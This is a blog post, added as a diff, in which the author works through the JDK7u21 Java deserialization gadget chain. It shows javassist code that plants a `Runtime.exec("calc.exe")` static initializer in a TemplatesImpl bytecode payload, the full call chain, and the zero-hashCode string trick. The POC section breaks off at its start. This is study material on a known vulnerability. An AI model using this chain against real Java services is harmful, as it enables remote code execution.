@@ -1,0 +1,559 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/2.png">
+  <link rel="icon" href="/img/2.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="JDK7u21原生链之前一直是看过许多文章（因为它不需要依赖别的库）就可以攻击。看到p神（知识星球）发了文章就手动跟一下。 javassist之前就已经学习过了。复习一下。 Demo12345package xsw6a;public class Demo &amp;#123;&amp;#125;  1234567891011121314151617181920package xsw6a;import javass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jdk7u21原生链">
+<meta property="og:url" content="http://example.com/2022/03/16/Jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/index.html">
+<meta property="og:site_name" content="Xsw6_a">
+<meta property="og:description" content="JDK7u21原生链之前一直是看过许多文章（因为它不需要依赖别的库）就可以攻击。看到p神（知识星球）发了文章就手动跟一下。 javassist之前就已经学习过了。复习一下。 Demo12345package xsw6a;public class Demo &amp;#123;&amp;#125;  1234567891011121314151617181920package xsw6a;import javass">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642740.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642784.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161526267.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642589.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642244.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161447992.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161450394.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642090.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161508532.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161515437.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161603435.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161604410.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643678.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161611242.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643460.png">
+<meta property="article:published_time" content="2022-03-16T08:42:43.000Z">
+<meta property="article:modified_time" content="2022-03-16T08:43:44.248Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642740.png">
+  
+  <title>Jdk7u21原生链 - Xsw6_a</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>热爱使我从未停下脚步</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-about-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Jdk7u21原生链">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-16 16:42" pubdate>
+        2022年3月16日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.5k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Jdk7u21原生链</h1>
+            
+            <div class="markdown-body">
+              <h1 id="JDK7u21原生链"><a href="#JDK7u21原生链" class="headerlink" title="JDK7u21原生链"></a>JDK7u21原生链</h1><p>之前一直是看过许多文章（因为它不需要依赖别的库）就可以攻击。看到p神（知识星球）发了文章就手动跟一下。</p>
+<h2 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h2><p>之前就已经学习过了。复习一下。</p>
+<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(Demo.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;System.out.println(\&quot;Xsw6_a\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(s);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">demohaha</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Demohaha&quot;</span>;<br>        ctClass.setName(demohaha);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里会生成如下的class文件。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642740.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316140909"></p>
+<p>然后如果这里没有重新设置<strong>setname</strong>，会出现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642784.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316141120"></p>
+<h2 id="TemplatesImp"><a href="#TemplatesImp" class="headerlink" title="TemplatesImp"></a>TemplatesImp</h2><p>因为之前学过了这个链子（就可以直接上手弹一个计算器了）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>            <span class="hljs-comment">// 创建 static 代码块，并插入代码</span><br>            cc.makeClassInitializer().insertBefore(cmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Evil&quot;</span>;<br>            cc.setName(randomClassName);<br><br>            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            templates.newTransformer();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>并且值得注意的是，虽然大多数网上的内容都有吧这两个代码</p>
+<p>（ <code>String randomClassName = &quot;Evil&quot;;``cc.setName(randomClassName);</code>）加入进去，但是实际上加不加都是无所谓的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161526267.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316152558"></p>
+<p>搞清楚到这里，就可以正式开启jdk7u21了。上面已经能通过TemplatesImpl进行谈计算器了，那么现在就要考虑如何在反序列化的时候调用到<code>templates.newTransformer()</code></p>
+<p>我个人的习惯是根据利用链子来学习。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-constructor">Proxy(Templates)</span>.hash<span class="hljs-constructor">Code()</span> (X)<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span> (X)<br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>hash<span class="hljs-constructor">CodeImpl()</span> (X)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (<span class="hljs-number">0</span>)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>member<span class="hljs-constructor">ValueHashCode()</span> (X)<br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>      <span class="hljs-constructor">Proxy(Templates)</span>.equals<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>equals<span class="hljs-constructor">Impl()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">              ...</span><br><span class="hljs-operator">                 </span><span class="hljs-comment">// TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                          ...</span><br><span class="hljs-operator">                            </span>MaliciousClass.&lt;clinit&gt;<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                              ...</span><br><span class="hljs-operator">                                </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="AnnotationInvocationHandler-equalsImpl（）"><a href="#AnnotationInvocationHandler-equalsImpl（）" class="headerlink" title="AnnotationInvocationHandler#equalsImpl（）"></a>AnnotationInvocationHandler#equalsImpl（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642589.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316143147"></p>
+<p>通过p神的解释，可以知道这里是经过遍历<strong>可控制类</strong>的所有方法。那么就可以实现上面所说的触发<code>templates.newTransformer()</code>。</p>
+<h2 id="AnnotationInvocationHandler-invoke（）"><a href="#AnnotationInvocationHandler-invoke（）" class="headerlink" title="AnnotationInvocationHandler#invoke（）"></a>AnnotationInvocationHandler#invoke（）</h2><p>现在就要想到如何调用到<code>equalsImpl()</code>。<br>我们来到这里。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642244.png" srcset="/img/loading.gif" lazyload></p>
+<p>很明显，这里又要进入到<code>AnnotationInvocationHandler#invoke()</code>，一个动态代理就可。注意一下if的判断。</p>
+<p><strong>当方法名等于“equals”，且仅有一个Object类型参数时，会调用到 equalsImp方法。</strong></p>
+<p>所以现在需要找到一个方法，<strong>在反序列化时对proxy调用equals方法</strong>。</p>
+<h2 id="HashSet-readObject（）"><a href="#HashSet-readObject（）" class="headerlink" title="HashSet#readObject（）"></a>HashSet#readObject（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161447992.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316144700"></p>
+<p>这里调试的时候在回来看。看了p神所说的这里就是（这里使用了一个HashMap，将对象保存在HashMap的key处来做去重）</p>
+<h2 id="HashMap-put（）"><a href="#HashMap-put（）" class="headerlink" title="HashMap#put（）"></a>HashMap#put（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161450394.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316145015"></p>
+<p>可以看到这里调用了key.equals(k)，两个不同的对象的 i 相等时，才会执行到 key.equals(k)。（<strong>if语句判断先后顺序</strong>）</p>
+<p>如何让让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”。为什么是哈希？<strong>int hash &#x3D; hash(key);</strong><br>**int i &#x3D; indexFor(hash, table.length)**。</p>
+<h2 id="HashMap-hash（）"><a href="#HashMap-hash（）" class="headerlink" title="HashMap#hash（）"></a>HashMap#hash（）</h2><p>跟进一下hash。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642090.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316145900"></p>
+<p>可以注意到这里判断其哈希值是否相等取决于，<strong>k.hashCode()<strong>，那么接下来自然而然要去看一下这两个类的hashCode。但是我并没有找到这两个类的</strong>hashCode</strong>。这里可以看一下p神怎么解释的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161508532.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316150844"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>                    System.out.println(Long.toHexString(i));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跑出来是<code>f5a5a608</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161515437.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316151531"></p>
+<p>这样其实一个完整的利用链就出来了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是利用<strong>javassist</strong>生成恶意类。</p>
+<p>为了调用<strong>transfrom()</strong>,寻找到AnnotationInvocationHandler的<strong>equalsImpl()</strong></p>
+<p>为了调用<strong>equalsImpl()<strong>寻找到了AnnotationInvocationHandler的</strong>invoke()</strong></p>
+<p>如何触发<strong>invoke()</strong>(采用动态代理)，为了满足if条件（找到**HashMap#put()**）</p>
+<p>为了触发 key.equals(k)，找到proxy对象与TemplateImpl对象的“哈希”相等</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="截图p神的理解"><a href="#截图p神的理解" class="headerlink" title="截图p神的理解"></a>截图p神的理解</h3><p>在经过我调试之后我发现。开始没有注意到这里有两个<strong>hashCodeImpl()<strong>。也就是p神所说，可以控制proxy的hashcode，那么任然会进入</strong>hashCodeImpl</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161603435.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316160253"></p>
+<p>在没有进行反序列化的时候就会来到第二个**hashCodeImpl()**。跟进去看一下。（这里也就跟p神的思路连接了起来。）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161604410.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316160416"></p>
+<p>这里也就是说，在我们经过<strong>map.put</strong>值之后，我们就会进入</p>
+<p>然后经过一些跟入不进去的调试。来到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643678.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316160723"></p>
+<p>继续调试，会来到，反序列化的入口点。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161611242.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316161146"></p>
+<p>这里<strong>instanceof 严格来说是Java中的一个双目运算符，用来测试一个对象是否为一个类的实例</strong>。所以我们会构造<strong>HashSet set &#x3D; new LinkedHashSet();</strong></p>
+<p>感觉好像没有什么用。（待会试试）。因为没有修改hash值，这里不会触发<strong>key.equals(k)</strong></p>
+<h3 id="Hash值"><a href="#Hash值" class="headerlink" title="Hash值"></a>Hash值</h3><p>接着就又会进入之前的hash判断。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643460.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220316163244"></p>
+<p>这里就将其修改成与proxy.hashCode与TemplatesImpl.hashCode联系到了一起。<br>当其相等的时候就触发了euqal方法。然后就成功连成整个链子了。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 